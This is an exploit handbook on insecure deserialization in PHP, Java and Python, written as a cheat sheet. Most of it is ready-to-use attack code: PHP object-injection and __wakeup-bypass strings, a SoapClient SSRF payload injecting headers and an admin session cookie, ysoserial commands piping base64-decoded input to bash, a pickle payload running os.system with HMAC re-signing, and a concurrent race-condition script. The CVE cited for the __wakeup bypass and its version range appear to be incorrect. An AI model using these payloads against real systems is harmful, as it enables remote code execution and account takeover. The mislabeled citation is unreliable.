# Deserialization Exploit Chain Handbook

## PHP Deserialization

### Basic Concepts
```php
// Serialization
$s = serialize($obj);  // O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";s:5:"super";}

// Deserialization
$obj = unserialize($s);

// Magic method trigger chain
__construct() → __wakeup() → __destruct()
__toString() → __call() → __get()
```

### Common Exploit Chains

#### 1. __wakeup Bypass (CVE-2017-12944 / PHP < 7.4)
```php
// When declared property count exceeds actual count, __wakeup is not called
O:4:"User":2:{...}   // normal
O:4:"User":3:{...}   // bypasses __wakeup (declared count 3 > actual 2)
```

#### 2. __toString Trigger
```php
class FileViewer {
    public $filename;
    function __toString() {
        return file_get_contents($this->filename);
    }
}
// Construct: O:10:"FileViewer":1:{s:8:"filename";s:8:"flag.php";}
```

#### 3. SoapClient CRLF Injection (SSRF)
```php
$target = "http://internal-service/";
$client = new SoapClient(null, array(
    'uri' => "http://attacker/",
    'location' => $target,
    'user_agent' => "Attacker\r\nX-Forwarded-For: 127.0.0.1\r\nCookie: session=admin",
));
// Serialize then trigger SSRF + CRLF header injection
echo urlencode(serialize($client));
```

#### 4. PHP Serialization Length Manipulation
```
// Exploit string length difference due to filtering
// s:5:"admin" (5 bytes) vs modified length mismatch
// Change the length value in the serialized string to truncate or inject
```

### PHP Deserialization String Escape

**Escape by expansion** (filter makes string longer):
```
// Filter: "x" → "xx" (1→2, +1 byte per occurrence)
// Inject: fill controllable property with ";}O:4:"Evil":1:{s:4:"cmd";s:6:"whoami";}
// Calculate how many "x" characters are needed to fill the length gap
```

**Escape by contraction** (filter makes string shorter):
```
// Filter: "xx" → "x" (2→1, -1 byte per occurrence)
// Use the length reduction to "swallow" subsequent serialized string characters
```

## Java Deserialization

### Common Gadgets

| Gadget Chain | Affected Component | Command Execution |
|-------------|-------------------|------------------|
| CommonsCollections1-7 | Apache Commons Collections | Runtime.exec() |
| CommonsBeanutils1 | Commons Beanutils | TemplatesImpl |
| Spring1 | Spring Framework | JdkDynamicProxy |
| Groovy1 | Groovy | MethodClosure |
| JBossInvoker | JBoss | InvokerTransformer |
| ROME | ROME | ObjectInstantiator |

### Detection Methods
```
# Check common ports/paths
/invoker/readonly
/jmx-console/
/web-console/
/jbossws/
```

### Common ysoserial Payloads
```bash
java -jar ysoserial.jar CommonsCollections5 "cmd" > payload.bin
java -jar ysoserial.jar CommonsCollections6 "bash -c {echo,BASE64}|{base64,-d}|bash" > payload.bin
```

## Python Deserialization

### pickle Deserialization RCE
```python
import pickle
import os

class Evil(object):
    def __reduce__(self):
        return (os.system, ('id',))

payload = pickle.dumps(Evil())
# Send payload to target
```

### Signature Bypass
```python
# If target uses HMAC signing
# 1. Obtain signing key (possibly through information disclosure)
# 2. Construct malicious pickle and re-sign
import hmac, hashlib
secret = b'secret_key'
payload = pickle.dumps(Evil())
signature = hmac.new(secret, payload, hashlib.sha256).hexdigest()
```

### __reduce__ Alternative
```python
# Using __setstate__
class Evil:
    def __setstate__(self, state):
        os.system('id')
```

## Race Condition Exploitation

```python
import requests
import threading

def exploit():
    # In the time window between deserialization and validation
    r = requests.post(url, data=payload)
    
# Send concurrently
threads = [threading.Thread(target=exploit) for _ in range(50)]
for t in threads:
    t.start()
for t in threads:
    t.join()
```
